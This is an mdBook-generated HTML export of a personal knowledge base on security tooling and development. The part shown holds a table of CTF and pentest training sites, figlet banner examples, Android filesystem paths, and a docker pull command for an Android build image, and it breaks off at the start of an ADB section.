<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title></title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="index.html">knowledge-based </a></li><li class="spacer"></li><li class="chapter-item affix "><li class="part-title">Knowledges</li><li class="chapter-item "><a href="tools/index.html"><strong aria-hidden="true">1.</strong> Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/android/index.html"><strong aria-hidden="true">1.1.</strong> Android</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/android/adb/index.html"><strong aria-hidden="true">1.1.1.</strong> ADB</a></li><li class="chapter-item "><a href="tools/android/apktool/index.html"><strong aria-hidden="true">1.1.2.</strong> APKTool</a></li><li class="chapter-item "><a href="tools/android/dex2jar/index.html"><strong aria-hidden="true">1.1.3.</strong> Dex2Jar</a></li><li class="chapter-item "><a href="tools/android/devtools_flutter/index.html"><strong aria-hidden="true">1.1.4.</strong> DevTools Flutter</a></li><li class="chapter-item "><a href="tools/android/emulator/index.html"><strong aria-hidden="true">1.1.5.</strong> emulator</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/android/emulator/AVDManager/index.html"><strong aria-hidden="true">1.1.5.1.</strong> AVDManager</a></li></ol></li><li class="chapter-item "><a href="tools/android/Drozer/index.html"><strong aria-hidden="true">1.1.6.</strong> Drozer</a></li><li class="chapter-item "><a href="tools/android/frida/index.html"><strong aria-hidden="true">1.1.7.</strong> Frida</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/android/frida/setup/index.html"><strong aria-hidden="true">1.1.7.1.</strong> Setup</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/android/frida/setup/NotRooted/index.html"><strong aria-hidden="true">1.1.7.1.1.</strong> Setup on not rooted device(s)</a></li><li class="chapter-item "><a href="tools/android/frida/setup/emulator/index.html"><strong aria-hidden="true">1.1.7.1.2.</strong> Setup on emulator</a></li><li class="chapter-item "><a href="tools/android/frida/setup/AndroidDocker/index.html"><strong aria-hidden="true">1.1.7.1.3.</strong> Setup in Android docker</a></li></ol></li><li class="chapter-item "><a href="tools/android/frida/snippets/index.html"><strong aria-hidden="true">1.1.7.2.</strong> Snippets</a></li><li class="chapter-item "><a href="tools/android/frida/tutorials/index.html"><strong aria-hidden="true">1.1.7.3.</strong> Tutorials</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/android/frida/tutorials/hacktricks/index.html"><strong aria-hidden="true">1.1.7.3.1.</strong> hacktricks</a></li><li class="chapter-item "><a href="tools/android/frida/tutorials/owasp/index.html"><strong aria-hidden="true">1.1.7.3.2.</strong> Owasp</a></li><li class="chapter-item "><a href="tools/android/frida/tutorials/BeetleBug/index.html"><strong aria-hidden="true">1.1.7.3.3.</strong> BeetleBug</a></li></ol></li></ol></li><li class="chapter-item "><a href="tools/android/r2frida/index.html"><strong aria-hidden="true">1.1.8.</strong> R2Frida</a></li><li class="chapter-item "><a href="tools/android/Gnirehtet/index.html"><strong aria-hidden="true">1.1.9.</strong> Gnirehtet</a></li></ol></li><li class="chapter-item "><a href="tools/docker/index.html"><strong aria-hidden="true">1.2.</strong> Docker</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/docker/dockerfile/index.html"><strong aria-hidden="true">1.2.1.</strong> Dockerfile</a></li></ol></li><li class="chapter-item "><a href="tools/git/index.html"><strong aria-hidden="true">1.3.</strong> Git</a></li><li class="chapter-item "><a href="tools/graphviz/index.html"><strong aria-hidden="true">1.4.</strong> GraphViz</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/graphviz/examples/index.html"><strong aria-hidden="true">1.4.1.</strong> Examples</a></li></ol></li><li class="chapter-item "><a href="tools/linux/index.html"><strong aria-hidden="true">1.5.</strong> linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/linux/bash/index.html"><strong aria-hidden="true">1.5.1.</strong> bash</a></li><li class="chapter-item "><a href="tools/linux/zsh/index.html"><strong aria-hidden="true">1.5.2.</strong> zsh</a></li></ol></li></ol></li><li class="chapter-item "><a href="forensics/index.html"><strong aria-hidden="true">2.</strong> Forensics</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="forensics/volatility3/index.html"><strong aria-hidden="true">2.1.</strong> volatility3</a></li><li class="chapter-item "><a href="forensics/glogg/index.html"><strong aria-hidden="true">2.2.</strong> glogg</a></li><li class="chapter-item "><a href="forensics/sleuthkit/index.html"><strong aria-hidden="true">2.3.</strong> sleuthkit</a></li></ol></li><li class="chapter-item "><a href="technics/index.html"><strong aria-hidden="true">3.</strong> Technics</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="technics/natural-referencing/index.html"><strong aria-hidden="true">3.1.</strong> Natural Referencing</a></li><li class="chapter-item "><a href="technics/web-scrapping/index.html"><strong aria-hidden="true">3.2.</strong> Web Scrapping</a></li><li class="chapter-item "><a href="technics/wireshark/index.html"><strong aria-hidden="true">3.3.</strong> Wireshark</a></li><li class="chapter-item "><a href="technics/nmap/index.html"><strong aria-hidden="true">3.4.</strong> nmap</a></li></ol></li><li class="chapter-item "><a href="OSINT/index.html"><strong aria-hidden="true">4.</strong> OSINT</a></li><li class="chapter-item "><a href="pentest/index.html"><strong aria-hidden="true">5.</strong> Pentest</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="pentest/BinaryExploitation/index.html"><strong aria-hidden="true">5.1.</strong> BinaryExploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="pentest/BinaryExploitation/Linux/index.html"><strong aria-hidden="true">5.1.1.</strong> Linux</a></li></ol></li><li class="chapter-item "><a href="pentest/useful-commands/index.html"><strong aria-hidden="true">5.2.</strong> Useful Commands</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="pentest/useful-commands/ssh/index.html"><strong aria-hidden="true">5.2.1.</strong> ssh</a></li></ol></li><li class="chapter-item "><a href="pentest/Metasploit/index.html"><strong aria-hidden="true">5.3.</strong> Netasploit</a></li><li class="chapter-item "><a href="pentest/PwdCracking/index.html"><strong aria-hidden="true">5.4.</strong> PwdCracking</a></li><li class="chapter-item "><a href="pentest/gdb/index.html"><strong aria-hidden="true">5.5.</strong> GDB</a></li><li class="chapter-item "><a href="pentest/BurpSuite/index.html"><strong aria-hidden="true">5.6.</strong> Burp Suite</a></li><li class="chapter-item "><a href="pentest/pwntools/index.html"><strong aria-hidden="true">5.7.</strong> pwntools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="pentest/pwntools/cheat_sheet/index.html"><strong aria-hidden="true">5.7.1.</strong> Cheat Sheet</a></li><li class="chapter-item "><a href="pentest/pwntools/assembly/index.html"><strong aria-hidden="true">5.7.2.</strong> Assembly</a></li><li class="chapter-item "><a href="pentest/pwntools/ROP/index.html"><strong aria-hidden="true">5.7.3.</strong> ROP</a></li><li class="chapter-item "><a href="pentest/pwntools/debugging/index.html"><strong aria-hidden="true">5.7.4.</strong> Pwntools Debugging</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="pentest/pwntools/debugging/scripts/index.html"><strong aria-hidden="true">5.7.4.1.</strong> Useful scripts</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="pentest/pwntools/debugging/scripts/interactive_debugging/index.html"><strong aria-hidden="true">5.7.4.1.1.</strong> Interactive debugging</a></li></ol></li></ol></li></ol></li><li class="chapter-item "><a href="pentest/Mobile/index.html"><strong aria-hidden="true">5.8.</strong> Mobile</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/index.html"><strong aria-hidden="true">5.8.1.</strong> red_fox_sec_training</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/web_view/index.html"><strong aria-hidden="true">5.8.1.1.</strong> Exploiting Android WebView Vulnerabilities</a></li><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/broad_cast_receivers/index.html"><strong aria-hidden="true">5.8.1.2.</strong> Exploiting Broadcast Receivers</a></li><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/content_providers/index.html"><strong aria-hidden="true">5.8.1.3.</strong> Exploiting Content Providers</a></li><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/drozer/index.html"><strong aria-hidden="true">5.8.1.4.</strong> Android Pentesting with Drozer</a></li><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/tapjacking/index.html"><strong aria-hidden="true">5.8.1.5.</strong> Android Tapjacking Vulnerability</a></li><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/crypto/index.html"><strong aria-hidden="true">5.8.1.6.</strong> Broken Cryptography in Android Applications</a></li><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/pentest_method/index.html"><strong aria-hidden="true">5.8.1.7.</strong> Android Pentesting Methodology (Pt. 1)</a></li><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/pentest_method/index.html"><strong aria-hidden="true">5.8.1.8.</strong> Android Pentesting Methodology (Pt. 2)</a></li><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/pentest_method/index.html"><strong aria-hidden="true">5.8.1.9.</strong> Android Pentesting Methodology (Pt. 3)</a></li><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/frida/index.html"><strong aria-hidden="true">5.8.1.10.</strong> Android Root Detection Bypass Using Frida</a></li><li class="chapter-item "><a href="pentest/Mobile/red_fox_sec_training/frida_ssl_pinning/index.html"><strong aria-hidden="true">5.8.1.11.</strong> SSL Pinning Bypass For Android Using Frida</a></li></ol></li></ol></li><li class="chapter-item "><a href="pentest/lab_kali_docker/index.html"><strong aria-hidden="true">5.9.</strong> Lab. Kali Docker</a></li><li class="chapter-item "><a href="pentest/Wireshark/index.html"><strong aria-hidden="true">5.10.</strong> Wireshark</a></li><li class="chapter-item "><a href="pentest/python_venv/index.html"><strong aria-hidden="true">5.11.</strong> python_venv</a></li></ol></li><li class="chapter-item "><a href="dev/index.html"><strong aria-hidden="true">6.</strong> dev</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="dev/python/index.html"><strong aria-hidden="true">6.1.</strong> Python</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="dev/python/snippets/index.html"><strong aria-hidden="true">6.1.1.</strong> snippets</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="dev/python/snippets/FullClickSnippet/index.html"><strong aria-hidden="true">6.1.1.1.</strong> Full Click Snippets</a></li><li class="chapter-item "><a href="dev/python/snippets/GetPostRequest/index.html"><strong aria-hidden="true">6.1.1.2.</strong> Get/Post Request</a></li><li class="chapter-item "><a href="dev/python/snippets/MovieToken/index.html"><strong aria-hidden="true">6.1.1.3.</strong> MovieToken</a></li><li class="chapter-item "><a href="dev/python/snippets/TcpChallenges/index.html"><strong aria-hidden="true">6.1.1.4.</strong> TCP Challenges</a></li><li class="chapter-item "><a href="dev/python/snippets/FlaskGunicorn/index.html"><strong aria-hidden="true">6.1.1.5.</strong> Flask / Gunicorn</a></li><li class="chapter-item "><a href="dev/python/snippets/ServerChallenge_pwntool/index.html"><strong aria-hidden="true">6.1.1.6.</strong> Server Chall. with Pwntool</a></li><li class="chapter-item "><a href="dev/python/snippets/SolveEquation/index.html"><strong aria-hidden="true">6.1.1.7.</strong> Solve Equation</a></li></ol></li></ol></li><li class="chapter-item "><a href="dev/rust/index.html"><strong aria-hidden="true">6.2.</strong> Rust</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="dev/rust/snippets/index.html"><strong aria-hidden="true">6.2.1.</strong> snippets</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="dev/rust/snippets/error/index.html"><strong aria-hidden="true">6.2.1.1.</strong> Error handling</a></li></ol></li><li class="chapter-item "><a href="dev/rust/optimization/index.html"><strong aria-hidden="true">6.2.2.</strong> Optimization</a></li></ol></li><li class="chapter-item "><a href="dev/Android/index.html"><strong aria-hidden="true">6.3.</strong> Android</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="dev/Android/MinimalProject/index.html"><strong aria-hidden="true">6.3.1.</strong> Minimal Project</a></li></ol></li><li class="chapter-item "><a href="dev/IA/index.html"><strong aria-hidden="true">6.4.</strong> IA</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="dev/IA/Ollama_vsCode/index.html"><strong aria-hidden="true">6.4.1.</strong> Ollama_vscode</a></li></ol></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="knowledge-based"><a class="header" href="#knowledge-based">Knowledge-based</a></h1>
<p>Set of knowledge organized by theme.</p>
<h2 id="current-personnal-training"><a class="header" href="#current-personnal-training">Current personnal training</a></h2>
<style>
td span {
    margin-top:10px; 
    padding-left:10px; 
    display:inline-block;
}
.badge_training {
  background-color: pink;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
  text: bold;
}
.badge_programmatic {
  background-color: #3a87ad;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.badge_language {
  background-color: purple;
  color: white;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.badge_game {
  background-color: yellow;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.badge_pentest {
  background-color: orange;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.badge_ctf {
  background-color: blue;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.badge_mobile {
  background-color: green;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.badge_wrietup {
  background-color: brown;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
</style>
<table>
    <thead>
        <tr>
            <th>Title</th>
            <th>Tags</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://exercism.org/users/sign_in">exercism</a></td>
            <td>
                <span class="badge_programmatic">Programmation</span>
                <span class="badge_training">Training</span>
            </td>
            <td>Site d'apprentissage de languages de programmation par challenge.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://qioz.fr/fr">QIOZ</a></td>
            <td>
                <span class="badge_language">Langue</span>
                <span class="badge_training">Training</span>
            </td>
            <td>Site d'apprentissage de langue étrangère</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://www.codingame.com">Coding Game</a></td>
            <td>
                <span class="badge_programmatic">Programmation</span>
                <span class="badge_training">Training</span>
                <span class="badge_game">Game</span>
            </td>
            <td>Site d'apprentissage de languages de programmation par le jeux.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://tryhackme.com">Try Hack Me</a></td>
            <td>
                <span class="badge_pentest">Pentest</span>
                <span class="badge_training">Training</span>
            </td>
            <td>Site d'apprentissage de Pentest</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://www.root-me.org">Root Me</a></td>
            <td>
                <span class="badge_pentest">Pentest</span>
                <span class="badge_training">Training</span>
                <span class="badge_ctf">CTF</span>
            </td>
            <td>Site de training pour CTF.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://ctf.hacker101.com">CTF hacker 101</a></td>
            <td>
                <span class="badge_training">Training</span>
                <span class="badge_ctf">CTF</span>
            </td>
            <td>Site de training pour CTF.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://ctf101.org/">CTF 101</a></td>
            <td>
               <span class="badge_training">Training</span>
               <span class="badge_ctf">CTF</span>
            </td>
            <td>Site de training pour CTF.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://github.com/xtiankisutsa/awesome-mobile-CTF">Awesome Mobile CTF</a></td>
            <td>
               <span class="badge_training">Training</span>
               <span class="badge_ctf">CTF</span>
               <span class="badge_mobile">Mobile</span>
            </td>
            <td>Site de training pour CTF Mobile.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://nolliv22.com">Write Up et blog (Nolliv22)</a></td>
            <td>
                <span class="badge_ctf">CTF</span>
                <span class="badge_wrietup">Write Up</span>
            </td>
            <td>Write Up CTF.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://ir0nstone.gitbook.io">Write Up et blog (ir0nstone)</a></td>
            <td>
                <span class="badge_ctf">CTF</span>
                <span class="badge_wrietup">Write Up</span>
            </td>
            <td>Write Up CTF.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://portswigger.net/web-security/">Port Swigger (Burp Suite)</a></td>
            <td>
                <span class="badge_training">Training</span>
                <span class="badge_pentest">Pentest</span>
            </td>
            <td>Site tuto de Burp Suite</
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://github.com/devploit/awesome-ctf-resources">Awesome CTF Resources</a></td>
            <td>
                <span class="badge_training">Training</span>
                <span class="badge_ctf">CTF</span>
                <span class="badge_wrietup">Write Up</span>
            </td>
            <td>Github resources for CTF training.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://pwn.college/">pwn.college</a></td>
            <td>
                <span class="badge_training">Training</span>
                <span class="badge_ctf">CTF</span>
            </td>
            <td>pwn.college is an education platform for students.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://cryptohack.org/">Crypto CTF</a></td>
            <td>
                <span class="badge_training">Training</span>
                <span class="badge_ctf">CTF</span>
            </td>
            <td>A free, fun platform for learning modern cryptography.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://docs.xanhacks.xyz/">CTF Docs</a></td>
            <td>
                <span class="badge_training">Training</span>
                <span class="badge_ctf">CTF</span>
                <span class="badge_wrietup">Write Up</span>
            </td>
            <td>On this documentation website, you will find resources (cheatsheets, methodology, CTF write ups, ...) on the following topics : Android, Crypto, Malware, OSINT, pentest, Pwn, Reverse engineering, web...</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://github.com/HackademINT">404CTF Write up</a></td>
            <td>
                <span class="badge_training">training</span>
                <span class="badge_programmatic">programmatic</span>
                <span class="badge_pentest">pentest</span>
                <span class="badge_ctf">ctf</span>
                <span class="badge_mobile">mobile</span>
                <span class="badge_wrietup">wrietup</span>
            </td>
            <td>Codes sources des challenges de l'édition 20XX du 404 CTF </td>
        </tr>
         <!-- ITEM --> 
        <tr>
            <td><a ref="https://exploitation.tymyrddin.dev/">Smithing (all about hacking)</a></td>
            <td>
                <span class="badge_training">training</span>
                <span class="badge_programmatic">programmatic</span>
                <span class="badge_pentest">pentest</span>
                <span class="badge_ctf">ctf (rootme)</span>
                <span class="badge_mobile">mobile</span>
                <span class="badge_wrietup">wrietup</span>
            </td>
            <td>While exploitation and privilege escalation is not the end goal, it is a key element of the attack life cycle and a major determinant in the success of a penetration test.</td>
        </tr>
    </tbody>
</table><div style="break-before: page; page-break-before: always;"></div><h1 id="tools"><a class="header" href="#tools">Tools</a></h1>
<p>Some cool tools I use/to use</p>
<h2 id="figlet"><a class="header" href="#figlet">Figlet</a></h2>
<p>Generate big banner.</p>
<p>TAG: ASCII, banner, title</p>
<pre><code class="language-shell">$ figlet -f smblock.tlf Test     
▀▛▘     ▐  
 ▌▞▀▖▞▀▘▜▀ 
 ▌▛▀ ▝▀▖▐ ▖
 ▘▝▀▘▀▀  ▀ 
$ figlet -f smascii12.tlf Test                    
.mmm,               
'&quot;W&quot;`           ][  
  W   dWb .dWW,]WWW 
  W  ]bmd[]bm,` ][  
  W  ]P&quot;&quot;` &quot;&quot;W, ][  
  W  'Wmm[]mmd[ ]bm 
  &quot;   '&quot;&quot;  &quot;&quot;&quot;   &quot;&quot; 

$ figlet -f Test
mmmmmmm                 m   
   #     mmm    mmm   mm#mm 
   #    #&quot;  #  #   &quot;    #   
   #    #&quot;&quot;&quot;&quot;   &quot;&quot;&quot;m    #   
   #    &quot;#mm&quot;  &quot;mmm&quot;    &quot;mm 

$ figlet -f ascii12.tlf Test
 mmmmmmmm                               
 &quot;&quot;&quot;##&quot;&quot;&quot;                        ##     
    ##      m####m   mm#####m  #######  
    ##     ##mmmm##  ##mmmm &quot;    ##     
    ##     ##&quot;&quot;&quot;&quot;&quot;&quot;   &quot;&quot;&quot;&quot;##m    ##     
    ##     &quot;##mmmm#  #mmmmm##    ##mmm  
    &quot;&quot;       &quot;&quot;&quot;&quot;&quot;    &quot;&quot;&quot;&quot;&quot;&quot;      &quot;&quot;&quot;&quot;  

$ figlet -f ascii9.tlf Test
mmmmmmm                 m   
   #     mmm    mmm   mm#mm 
   #    #&quot;  #  #   &quot;    #   
   #    #&quot;&quot;&quot;&quot;   &quot;&quot;&quot;m    #   
   #    &quot;#mm&quot;  &quot;mmm&quot;    &quot;mm 

$ figlet -f bigascii9.tlf Test
#######                 #   
   #                    #   
   #     ###   :###:  ##### 
   #       :#  #: .#    #   
   #    #   #  #:.      #   
   #    #####  .###:    #   
   #    #         :#    #   
   #        #  #. :#    #.  
   #     ###:  :###:    :## 

$ figlet -f bigascii12.tlf Test
                                        
 ########                               
 ########                        ##     
    ##                           ##     
    ##      .####:    :#####.  #######  
    ##     .######:  ########  #######  
    ##     ##:  :##  ##:  .:#    ##     
    ##     ########  ##### .     ##     
    ##     ########  .######:    ##     
    ##     ##           .: ##    ##     
    ##     ###.  :#  #:.  :##    ##.    
    ##     .#######  ########    #####  
    ##      .#####:  . ####      .####  

$ figlet -f future.tlf Test
╺┳╸┏━╸┏━┓╺┳╸
 ┃ ┣╸ ┗━┓ ┃ 
 ╹ ┗━╸┗━┛ ╹ 

$ figlet -f letter.tlf Test
TTTTT EEEEE  SSSS TTTTT 
  T   E     S       T   
  T   EEEE   SSS    T   
  T   E         S   T   
  T   EEEEE SSSS    T   

$ figlet -f mono12.tlf   Test 
 ▄▄▄▄▄▄▄▄                               
 ▀▀▀██▀▀▀                        ██     
    ██      ▄████▄   ▄▄█████▄  ███████  
    ██     ██▄▄▄▄██  ██▄▄▄▄ ▀    ██     
    ██     ██▀▀▀▀▀▀   ▀▀▀▀██▄    ██     
    ██     ▀██▄▄▄▄█  █▄▄▄▄▄██    ██▄▄▄  
    ▀▀       ▀▀▀▀▀    ▀▀▀▀▀▀      ▀▀▀▀  
                                        
$ figlet -f pagga.tlf  Test 
░▀█▀░█▀▀░█▀▀░▀█▀
░░█░░█▀▀░▀▀█░░█░
░░▀░░▀▀▀░▀▀▀░░▀░
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="android"><a class="header" href="#android">Android</a></h1>
<h2 id="path-user-land"><a class="header" href="#path-user-land">Path (USer land)</a></h2>
<table>
    <thead>
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>/data/data/<code>&lt;package name&gt;</code>/databases</td>
            <td>App databases</td>
        </tr>
        <tr>
            <td>/data/data/<code>&lt;package name&gt;</code>/shared_prefs/</td>
            <td>Shared preferences</td>
        </tr>
        <tr>
            <td>/mnt/sdcard/Download/</td>
            <td>Download folder</td>
        </tr>
        <tr>
            <td>/data/app</td>
            <td>Apk installed by user</td>
        </tr>
        <tr>
            <td>/system/app</td>
            <td>Pre-installed APK files</td>
        </tr>
        <tr>
            <td>/mmt/asec</td>
            <td>Encrypted apps (App2SD)</td>
        </tr>
        <tr>
            <td>/mmt/emmc</td>
            <td>Internal SD Card</td>
        </tr>
        <tr>
            <td>/mmt/adcard</td>
            <td>External/Internal SD Card</td>
        </tr>
        <tr>
            <td>/mmt/adcard/external_sd</td>
            <td>External SD Card</td>
        </tr>
    </tbody>
</table>
<h2 id="usefull-docker"><a class="header" href="#usefull-docker">Usefull docker</a></h2>
<p><a href="https://hub.docker.com/r/mingc/android-build-box">mingc/android-build-box</a> An optimized docker image includes Android, Kotlin, Flutter sdk. </p>
<pre><code class="language-shell">$ docker pull mingc/android-build-box
</code></pre>
<p><a href="https://hub.docker.com/r/mingc/android-build-box">Work in progress</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="android-debug-bridge-adb"><a class="header" href="#android-debug-bridge-adb">Android Debug Bridge (<code>adb</code>)</a></h1>
<ul>
<li><a href="https://www.automatetheplanet.com/adb-cheat-sheet/">Android ADB Cheat Sheet¶</a></li>
